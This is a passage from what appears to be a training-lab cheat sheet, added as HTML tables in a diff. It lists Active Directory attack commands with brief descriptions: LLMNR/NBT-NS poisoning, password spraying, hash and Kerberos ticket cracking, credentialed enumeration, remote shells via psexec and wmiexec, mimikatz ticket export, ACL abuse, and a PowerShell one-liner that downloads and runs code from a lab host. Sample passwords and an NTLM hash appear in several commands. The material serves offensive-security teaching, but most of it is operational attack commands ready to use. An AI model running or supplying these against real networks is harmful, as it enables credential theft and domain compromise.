+<td>Runs the Kerbrute tool to discover usernames in the domain (<code>example.LOCAL</code>) specified proceeding the <code>-d</code> option and the associated domain controller specified proceeding <code>--dc</code>using a wordlist and outputs (<code>-o</code>) the results to a specified file. Performed from a Linux-based host.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="llmnrntb-ns-poisoning">LLMNR/NTB-NS Poisoning</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>responder -h</code></td>
+<td>Used to display the usage instructions and various options available in <code>Responder</code> from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt</code></td>
+<td>Uses <code>hashcat</code> to crack <code>NTLMv2</code> (<code>-m</code>) hashes that were captured by responder and saved in a file (<code>frond_ntlmv2</code>). The cracking is done based on a specified wordlist.</td>
+</tr>
+<tr>
+<td><code>Import-Module .\Inveigh.ps1</code></td>
+<td>Using the <code>Import-Module</code> PowerShell cmd-let to import the Windows-based tool <code>Inveigh.ps1</code>.</td>
+</tr>
+<tr>
+<td><code>(Get-Command Invoke-Inveigh).Parameters</code></td>
+<td>Used to output many of the options &amp; functionality available with <code>Invoke-Inveigh</code>. Peformed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y</code></td>
+<td>Starts <code>Inveigh</code> on a Windows-based host with LLMNR &amp; NBNS spoofing enabled and outputs the results to a file.</td>
+</tr>
+<tr>
+<td><code>.\Inveigh.exe</code></td>
+<td>Starts the <code>C#</code> implementation of <code>Inveigh</code> from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey \|foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}</code></td>
+<td>PowerShell script used to disable NBT-NS on a Windows host.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="password-spraying-password-policies">Password Spraying &amp; Password Policies</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>#!/bin/bash for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}} do echo $x; done</code></td>
+<td>Bash script used to generate <code>16,079,616</code> possible username combinations from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol</code></td>
+<td>Uses <code>CrackMapExec</code>and valid credentials (<code>avazquez:Password123</code>) to enumerate the password policy (<code>--pass-pol</code>) from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>rpcclient -U "" -N 172.16.5.5</code></td>
+<td>Uses <code>rpcclient</code> to discover information about the domain through <code>SMB NULL</code> sessions. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>rpcclient $&gt; querydominfo</code></td>
+<td>Uses <code>rpcclient</code> to enumerate the password policy in a target Windows domain from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>enum4linux -P 172.16.5.5</code></td>
+<td>Uses <code>enum4linux</code> to enumerate the password policy (<code>-P</code>) in a target Windows domain from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>enum4linux-ng -P 172.16.5.5 -oA ilfreight</code></td>
+<td>Uses <code>enum4linux-ng</code> to enumerate the password policy (<code>-P</code>) in a target Windows domain from a Linux-based host, then presents the output in YAML &amp; JSON saved in a file proceeding the <code>-oA</code> option.</td>
+</tr>
+<tr>
+<td><code>ldapsearch -h 172.16.5.5 -x -b "DC=example,DC=LOCAL" -s sub "*" \| grep -m 1 -B 10 pwdHistoryLength</code></td>
+<td>Uses <code>ldapsearch</code> to enumerate the password policy in a target Windows domain from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>net accounts</code></td>
+<td>Used to enumerate the password policy in a Windows domain from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Import-Module .\PowerView.ps1</code></td>
+<td>Uses the Import-Module cmd-let to import the <code>PowerView.ps1</code> tool from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainPolicy</code></td>
+<td>Used to enumerate the password policy in a target Windows domain from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>enum4linux -U 172.16.5.5 \| grep "user:" \| cut -f2 -d"[" \| cut -f1 -d"]"</code></td>
+<td>Uses <code>enum4linux</code> to discover user accounts in a target Windows domain, then leverages <code>grep</code> to filter the output to just display the user from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>rpcclient -U "" -N 172.16.5.5 rpcclient $&gt; enumdomuser</code></td>
+<td>Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>crackmapexec smb 172.16.5.5 --users</code></td>
+<td>Uses <code>CrackMapExec</code> to discover users (<code>--users</code>) in a target Windows domain from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>ldapsearch -h 172.16.5.5 -x -b "DC=example,DC=LOCAL" -s sub "(&amp;(objectclass=user))" \| grep sAMAccountName: \| cut -f2 -d" "</code></td>
+<td>Uses <code>ldapsearch</code> to discover users in a target Windows doman, then filters the output using <code>grep</code> to show only the <code>sAMAccountName</code> from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>./windapsearch.py --dc-ip 172.16.5.5 -u "" -U</code></td>
+<td>Uses the python tool <code>windapsearch.py</code> to discover users in a target Windows domain from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 \| grep Authority; done</code></td>
+<td>Bash one-liner used to perform a password spraying attack using <code>rpcclient</code> and a list of users (<code>valid_users.txt</code>) from a Linux-based host. It also filters out failed attempts to make the output cleaner.</td>
+</tr>
+<tr>
+<td><code>kerbrute passwordspray -d example.local --dc 172.16.5.5 valid_users.txt Welcome1</code></td>
+<td>Uses <code>kerbrute</code> and a list of users (<code>valid_users.txt</code>) to perform a password spraying attack against a target Windows domain from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 \| grep +</code></td>
+<td>Uses <code>CrackMapExec</code> and a list of users (<code>valid_users.txt</code>) to perform a password spraying attack against a target Windows domain from a Linux-based host. It also filters out logon failures using <code>grep</code>.</td>
+</tr>
+<tr>
+<td><code>sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123</code></td>
+<td>Uses <code>CrackMapExec</code> to validate a set of credentials from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf \| grep +</code></td>
+<td>Uses <code>CrackMapExec</code> and the -<code>-local-auth</code> flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using <code>grep</code>.</td>
+</tr>
+<tr>
+<td><code>Import-Module .\DomainPasswordSpray.ps1</code></td>
+<td>Used to import the PowerShell-based tool <code>DomainPasswordSpray.ps1</code>from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue</code></td>
+<td>Performs a password spraying attack and outputs (-OutFile) the results to a specified file (<code>spray_success</code>) from a Windows-based host.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="enumerating-security-controls">Enumerating Security Controls</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Get-MpComputerStatus</code></td>
+<td>PowerShell cmd-let used to check the status of <code>Windows Defender Anti-Virus</code>from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections</code></td>
+<td>PowerShell cmd-let used to view <code>AppLocker</code> policies from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>$ExecutionContext.SessionState.LanguageMode</code></td>
+<td>PowerShell script used to discover the <code>PowerShell Language Mode</code> being used on a Windows-based host. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Find-LAPSDelegatedGroups</code></td>
+<td>A <code>LAPSToolkit</code> function that discovers <code>LAPS Delegated Groups</code> from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Find-AdmPwdExtendedRights</code></td>
+<td>A <code>LAPSTookit</code> function that checks the rights on each computer with LAPS enabled for any groups with read access and users with <code>All Extended Rights</code>. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-LAPSComputers</code></td>
+<td>A <code>LAPSToolkit</code> function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="credentialed-enumeration">Credentialed Enumeration</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>xfreerdp /u:forend@example.local /p:Klmcargo2 /v:172.16.5.25</code></td>
+<td>Connects to a Windows target using valid credentials. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users</code></td>
+<td>Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover more users (<code>--users</code>) in a target Windows domain. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups</code></td>
+<td>Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover groups (<code>--groups</code>) in a target Windows domain. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users</code></td>
+<td>Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to check for a list of logged on users (<code>--loggedon-users</code>) on the target Windows host. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares</code></td>
+<td>Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover any smb shares (<code>--shares</code>). Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share</code></td>
+<td>Authenticates with a Windows target over <code>smb</code> using valid credentials and utilizes the CrackMapExec module (<code>-M</code>) <code>spider_plus</code> to go through each readable share (<code>Dev-share</code>) and list all readable files. The results are outputted in <code>JSON</code>. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>smbmap -u forend -p Klmcargo2 -d example.LOCAL -H 172.16.5.5</code></td>
+<td>Enumerates the target Windows domain using valid credentials and lists shares &amp; permissions available on each within the context of the valid credentials used and the target Windows host (<code>-H</code>). Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>smbmap -u forend -p Klmcargo2 -d example.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only</code></td>
+<td>Enumerates the target Windows domain using valid credentials and performs a recursive listing (<code>-R</code>) of the specified share (<code>SYSVOL</code>) and only outputs a list of directories (<code>--dir-only</code>) in the share. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>rpcclient $&gt; queryuser 0x457</code></td>
+<td>Enumerates a target user account in a Windows domain using its relative identifier (<code>0x457</code>). Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>rpcclient $&gt; enumdomusers</code></td>
+<td>Discovers user accounts in a target Windows domain and their associated relative identifiers (<code>rid</code>). Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>psexec.py example.local/wley:'transporter@4'@172.16.5.125</code></td>
+<td>Impacket tool used to connect to the <code>CLI</code> of a Windows target via the <code>ADMIN$</code>administrative share with valid credentials. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>wmiexec.py example.local/wley:'transporter@4'@172.16.5.5</code></td>
+<td>Impacket tool used to connect to the <code>CLI</code> of a Windows target via <code>WMI</code> with valid credentials. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>windapsearch.py -h</code></td>
+<td>Used to display the options and functionality of windapsearch.py. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u example\wley -p transporter@4 --da</code></td>
+<td>Used to enumerate the domain admins group (<code>--da</code>) using a valid set of credentials on a target Windows domain. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u example\wley -p transporter@4 -PU</code></td>
+<td>Used to perform a recursive search (<code>-PU</code>) for users with nested permissions using valid credentials. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d example.local -c all</code></td>
+<td>Executes the python implementation of BloodHound (<code>bloodhound.py</code>) with valid credentials and specifies a name server (<code>-ns</code>) and target Windows domain (<code>example.local</code>) as well as runs all checks (<code>-c all</code>). Runs using valid credentials. Performed from a Linux-based host.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="enumeration-by-living-off-the-land">Enumeration by Living Off the Land</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Get-Module</code></td>
+<td>PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Import-Module ActiveDirectory</code></td>
+<td>Loads the <code>Active Directory</code> PowerShell module from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-ADDomain</code></td>
+<td>PowerShell cmd-let used to gather Windows domain information from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName</code></td>
+<td>PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by <code>ServicePrincipalName</code>. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-ADTrust -Filter *</code></td>
+<td>PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (<code>-Filter *</code>). Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-ADGroup -Filter * \| select name</code></td>
+<td>PowerShell cmd-let used to enumerate groups in a target Windows domain and filters by the name of the group (<code>select name</code>). Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-ADGroup -Identity "Backup Operators"</code></td>
+<td>PowerShell cmd-let used to search for a specifc group (<code>-Identity "Backup Operators"</code>). Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-ADGroupMember -Identity "Backup Operators"</code></td>
+<td>PowerShell cmd-let used to discover the members of a specific group (<code>-Identity "Backup Operators"</code>). Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Export-PowerViewCSV</code></td>
+<td>PowerView script used to append results to a <code>CSV</code> file. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>ConvertTo-SID</code></td>
+<td>PowerView script used to convert a <code>User</code> or <code>Group</code> name to it's <code>SID</code>. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainSPNTicket</code></td>
+<td>PowerView script used to request the kerberos ticket for a specified service principal name (<code>SPN</code>). Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-Domain</code></td>
+<td>PowerView script used tol return the AD object for the current (or specified) domain. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainController</code></td>
+<td>PowerView script used to return a list of the target domain controllers for the specified target domain. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainUser</code></td>
+<td>PowerView script used to return all users or specific user objects in AD. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainComputer</code></td>
+<td>PowerView script used to return all computers or specific computer objects in AD. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainGroup</code></td>
+<td>PowerView script used to eturn all groups or specific group objects in AD. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainOU</code></td>
+<td>PowerView script used to search for all or specific OU objects in AD. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Find-InterestingDomainAcl</code></td>
+<td>PowerView script used to find object <code>ACLs</code> in the domain with modification rights set to non-built in objects. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainGroupMember</code></td>
+<td>PowerView script used to return the members of a specific domain group. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainFileServer</code></td>
+<td>PowerView script used to return a list of servers likely functioning as file servers. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainDFSShare</code></td>
+<td>PowerView script used to return a list of all distributed file systems for the current (or specified) domain. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainGPO</code></td>
+<td>PowerView script used to return all GPOs or specific GPO objects in AD. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainPolicy</code></td>
+<td>PowerView script used to return the default domain policy or the domain controller policy for the current domain. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-NetLocalGroup</code></td>
+<td>PowerView script used to enumerate local groups on a local or remote machine. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-NetLocalGroupMember</code></td>
+<td>PowerView script enumerate members of a specific local group. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-NetShare</code></td>
+<td>PowerView script used to return a list of open shares on a local (or a remote) machine. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-NetSession</code></td>
+<td>PowerView script used to return session information for the local (or a remote) machine. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Test-AdminAccess</code></td>
+<td>PowerView script used to test if the current user has administrative access to the local (or a remote) machine. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Find-DomainUserLocation</code></td>
+<td>PowerView script used to find machines where specific users are logged into. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Find-DomainShare</code></td>
+<td>PowerView script used to find reachable shares on domain machines. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Find-InterestingDomainShareFile</code></td>
+<td>PowerView script that searches for files matching specific criteria on readable shares in the domain. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Find-LocalAdminAccess</code></td>
+<td>PowerView script used to find machines on the local domain where the current user has local administrator access Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainTrust</code></td>
+<td>PowerView script that returns domain trusts for the current domain or a specified domain. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-ForestTrust</code></td>
+<td>PowerView script that returns all forest trusts for the current forest or a specified forest. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainForeignUser</code></td>
+<td>PowerView script that enumerates users who are in groups outside of the user's domain. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainForeignGroupMember</code></td>
+<td>PowerView script that enumerates groups with users outside of the group's domain and returns each foreign member. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainTrustMapping</code></td>
+<td>PowerView script that enumerates all trusts for current domain and any others seen. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainGroupMember -Identity "Domain Admins" -Recurse</code></td>
+<td>PowerView script used to list all the members of a target group (<code>"Domain Admins"</code>) through the use of the recurse option (<code>-Recurse</code>). Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName</code></td>
+<td>PowerView script used to find users on the target Windows domain that have the <code>Service Principal Name</code> set. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>.\Snaffler.exe -d example.LOCAL -s -v data</code></td>
+<td>Runs a tool called <code>Snaffler</code> against a target Windows domain that finds various kinds of data in shares that the compromised account has access to. Performed from a Windows-based host.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="transfering-files">Transfering Files</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sudo python3 -m http.server 8001</code></td>
+<td>Starts a python web server for quick hosting of files. Performed from a Linux-basd host.</td>
+</tr>
+<tr>
+<td><code>"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"</code></td>
+<td>PowerShell one-liner used to download a file from a web server. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/</code></td>
+<td>Starts a impacket <code>SMB</code> server for quick hosting of a file. Performed from a Windows-based host.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="kerberoasting">Kerberoasting</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sudo python3 -m pip install .</code></td>
+<td>Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>GetUserSPNs.py -h</code></td>
+<td>Impacket tool used to display the options and functionality of <code>GetUserSPNs.py</code> from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>GetUserSPNs.py -dc-ip 172.16.5.5 example.LOCAL/mholliday</code></td>
+<td>Impacket tool used to get a list of <code>SPNs</code> on the target Windows domain from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>GetUserSPNs.py -dc-ip 172.16.5.5 example.LOCAL/mholliday -request</code></td>
+<td>Impacket tool used to download/request (<code>-request</code>) all TGS tickets for offline processing from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>GetUserSPNs.py -dc-ip 172.16.5.5 example.LOCAL/mholliday -request-user sqldev</code></td>
+<td>Impacket tool used to download/request (<code>-request-user</code>) a TGS ticket for a specific user account (<code>sqldev</code>) from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>GetUserSPNs.py -dc-ip 172.16.5.5 example.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs</code></td>
+<td>Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (<code>-outputfile sqldev_tgs</code>) linux-based host.</td>
+</tr>
+<tr>
+<td><code>hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force</code></td>
+<td>Attempts to crack the Kerberos (<code>-m 13100</code>) ticket hash (<code>sqldev_tgs</code>) using <code>hashcat</code> and a wordlist (<code>rockyou.txt</code>) from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>setspn.exe -Q */*</code></td>
+<td>Used to enumerate <code>SPNs</code> in a target Windows domain from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.example.local:1433"</code></td>
+<td>PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>setspn.exe -T example.LOCAL -Q */* \| Select-String '^CN' -Context 0,1 \| % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }</code></td>
+<td>Used to download/request all TGS tickets from a WIndows-based host.</td>
+</tr>
+<tr>
+<td><code>mimikatz # base64 /out:true</code></td>
+<td><code>Mimikatz</code> command that ensures TGS tickets are extracted in <code>base64</code> format from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>kerberos::list /export</code></td>
+<td><code>Mimikatz</code> command used to extract the TGS tickets from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>echo "&lt;base64 blob&gt;" \| tr -d \\n</code></td>
+<td>Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host.</td>
+</tr>
+<tr>
+<td><code>cat encoded_file \| base64 -d &gt; sqldev.kirbi</code></td>
+<td>Used to output a file (<code>encoded_file</code>) into a .kirbi file in base64 (<code>base64 -d &gt; sqldev.kirbi</code>) format from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>python2.7 kirbi2john.py sqldev.kirbi</code></td>
+<td>Used to extract the <code>Kerberos ticket</code>. This also creates a file called <code>crack_file</code> from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file &gt; sqldev_tgs_hashcat</code></td>
+<td>Used to modify the <code>crack_file</code> for <code>Hashcat</code> from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>cat sqldev_tgs_hashcat</code></td>
+<td>Used to view the prepared hash from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt</code></td>
+<td>Used to crack the prepared Kerberos ticket hash (<code>sqldev_tgs_hashcat</code>) using a wordlist (<code>rockyou.txt</code>) from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>Import-Module .\PowerView.ps1 Get-DomainUser * -spn \| select samaccountname</code></td>
+<td>Uses PowerView tool to extract <code>TGS Tickets</code> . Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainUser -Identity sqldev \| Get-DomainSPNTicket -Format Hashcat</code></td>
+<td>PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for <code>Hashcat</code> from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainUser * -SPN \| Get-DomainSPNTicket -Format Hashcat \| Export-Csv .\ilfreight_tgs.csv -NoTypeInformation</code></td>
+<td>Exports all TGS tickets to a <code>.CSV</code> file (<code>ilfreight_tgs.csv</code>) from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>cat .\ilfreight_tgs.csv</code></td>
+<td>Used to view the contents of the .csv file from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>.\Rubeus.exe</code></td>
+<td>Used to view the options and functionality possible with the tool <code>Rubeus</code>. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>.\Rubeus.exe kerberoast /stats</code></td>
+<td>Used to check the kerberoast stats (<code>/stats</code>) within the target Windows domain from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap</code></td>
+<td>Used to request/download TGS tickets for accounts with the <code>admin</code> count set to <code>1</code> then formats the output in an easy to view &amp; crack manner (<code>/nowrap</code>) . Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>.\Rubeus.exe kerberoast /user:testspn /nowrap</code></td>
+<td>Used to request/download a TGS ticket for a specific user (<code>/user:testspn</code>) the formats the output in an easy to view &amp; crack manner (<code>/nowrap</code>). Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes</code></td>
+<td>PowerView tool used to check the <code>msDS-SupportedEncryptionType</code> attribute associated with a specific user account (<code>testspn</code>). Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt</code></td>
+<td>Used to attempt to crack the ticket hash using a wordlist (<code>rockyou.txt</code>) from a Linux-based host .</td>
+</tr>
+</tbody>
+</table>
+<h2 id="acl-enumeration-tactics">ACL Enumeration &amp; Tactics</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Find-InterestingDomainAcl</code></td>
+<td>PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Import-Module .\PowerView.ps1 $sid = Convert-NameToSid wley</code></td>
+<td>Used to import PowerView and retrieve the <code>SID</code>of a specific user account (<code>wley</code>) from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainObjectACL -Identity * \| ? {$_.SecurityIdentifier -eq $sid}</code></td>
+<td>Used to find all Windows domain objects that the user has rights over by mapping the user's <code>SID</code> to the <code>SecurityIdentifier</code> property from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>$guid= "00299570-246d-11d0-a768-00aa006e0529" Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * \| Select Name,DisplayName,DistinguishedName,rightsGuid \| ?{$_.rightsGuid -eq $guid} \| fl</code></td>
+<td>Used to perform a reverse search &amp; map to a <code>GUID</code> value from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainObjectACL -ResolveGUIDs -Identity * \| ? {$_.SecurityIdentifier -eq $sid}</code></td>
+<td>Used to discover a domain object's ACL by performing a search based on GUID's (<code>-ResolveGUIDs</code>) from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-ADUser -Filter * \| Select-Object -ExpandProperty SamAccountName &gt; ad_users.txt</code></td>
+<td>Used to discover a group of user accounts in a target Windows domain and add the output to a text file (<code>ad_users.txt</code>) from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" \| Select-Object Path -ExpandProperty Access \| Where-Object {$_.IdentityReference -match 'example\\wley'}}</code></td>
